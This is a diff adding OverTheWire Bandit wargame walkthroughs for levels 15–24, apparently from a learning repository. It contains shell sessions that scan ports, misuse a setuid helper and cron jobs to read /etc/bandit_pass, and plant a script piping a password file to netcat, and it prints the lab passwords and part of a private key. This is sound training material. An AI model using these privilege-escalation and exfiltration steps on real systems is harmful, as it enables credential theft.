@@ -219,4 +219,162 @@ Correct!
 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
 ```
 Lvl 15 :-
+Quite easy, u just have to add --ssl flag to ncat 
+```bash
+bandit15@bandit:~$ ncat --ssl localhost 30001
+8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
+Correct!
+kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
+```
+-----------
+Lvl 16 :-
+It's a matter of port scanning, and trying to connect to each one of them, first we will use nmap to scan for the open ports
+```bash
+bandit16@bandit:~$ nmap 127.0.0.1 -p31000-32000
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-30 10:52 UTC
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00016s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+31046/tcp open  unknown
+31518/tcp open  unknown
+31691/tcp open  unknown
+31790/tcp open  unknown
+31960/tcp open  unknown
 
+Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds
+```
+Then, we will try to connect to each port individually, using ncat ... the correct port was 31790
+
+```bash
+bandit16@bandit:~$ ncat --ssl 127.0.0.1 31790
+kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
+Correct!
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+... //rest of the ssh key
+``` 
+-------------------
+Lvl 17 :-
+Simply using diff command with the 2 password files as arguments, It showed the line with difference between them
+```bash
+bandit17@bandit:~$ diff passwords.old passwords.new
+42c42
+< bSrACvJvvBSxEM2SGsV5sn09vc3xgqyp //here it shows that .new has this line
+---
+> x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO //here it shows that .old has this line
+```
+-----------
+Lvl 18 :-
+Sadly, We cannot login to this level, We will be disconnected every time we try to connect, What a bad luck!
+But!!
+We can use scp which is used to securely copy files between devices over ssh, we just need to grab that readme file to the local machine 
+```bash
+$ scp -P 2220 bandit18@bandit.labs.overthewire.org:/home/bandit18/readme . && cat readme
+```
+------------
+Lvl 19 :-
+Now, It's a matter of user's permissions, The binary present in the home directory seems to run commands with effective uid for bandit20 
+```bash
+bandit19@bandit:~$ ./bandit20-do 
+Run a command as another user.
+  Example: ./bandit20-do id
+bandit19@bandit:~$ ./bandit20-do id
+uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
+```
+Which means we can read the file in /etc/bandit_pass as if we were the user bandit20
+```bash
+bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
+0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+```
+--------------
+Lvl20 :-
+Here we have to to make 2 things at once, open a Listening connection at a specific port and stream a text (the password for the current level) to this connection
+first we have to open a netcat server to listen on a port and pipe the password to it
+```bash
+bandit20@bandit:~$ echo -n "0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO" | nc -lvp 30023 &
+[1] 4062049
+Listening on 0.0.0.0 30023
+```
+Now we have a background process of a netcat server listening for a connection to pipe some text to it, SO we have to use that binary using the same port number in the netcat server
+```bash
+bandit20@bandit:~$ ./suconnect 30023
+Connection received on localhost 41856
+Read: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+Password matches, sending next password
+bandit20@bandit:~$ EeoULMCra2q0dSkYj561DX7s1CpBuOBt
+```
+------------------
+Lvl 21 :-
+This challenge is a matter of some tracing, Reading the files /etc/cron.d and follow paths of executables
+```bash
+bandit21@bandit:~$ cd /etc/cron.d
+bandit21@bandit:/etc/cron.d$ ls
+cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  otw-tmp-dir  sysstat
+bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh 
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@bandit:/etc/cron.d$ cat /tmp//t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+```
+---------------------
+Lvl 23 :-
+Here, and by following along with the cron job
+```bash
+bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+```
+And AFter inspecting that sh script 
+```bash
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh 
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+```
+We will see that it copies its password value which we need to view but do not have the permission to another non-protected temporary file, All we need is to act as if we were that user as the path of the file is dependent on the username, so I will execute all the commands in this script manually
+```bash
+bandit22@bandit:~$ myname=bandit23
+bandit22@bandit:~$ mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+bandit22@bandit:~$ cat /tmp/$mytarget
+0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+```
+-------------------
+lvl 23 :-
+This challenge is a little bit tricky, we can utilise the cron job that executes every script in the /var/spool/bandit24/foo, so we will make a simple script that reads the password from /etc/bandit_pass/bandit24 and send the data to an existing listening socket with netcat
+```bash
+bandit23@bandit:/tmp/midgeek$ mkdir /tmp/bandd14
+bandit23@bandit:/tmp/bandd14$ vim sj.sh
+```
+```bash
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 | nc 127.0.0.1 32011
+```
+Then we have to start the netcat server and copy the script to the desired directory
+```bash
+bandit23@bandit:/tmp/bandd14$ nc -lvp 32011 > ott &
+[1] 1953737
+bandit23@bandit:/tmp/bandd14$ Listening on 0.0.0.0 32011
+bandit23@bandit:/tmp/bandd14$ cp sj.sh /var/spool/bandit24/foo/script.sh && chmod +x /var/spool/bandit24/foo/script.sh
+bandit23@bandit:/tmp/bandd14$ Connection received on localhost 46472 //after a while, now we have the output file
+bandit23@bandit:/tmp/bandd14$ cat ott
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+```
+--------------------------
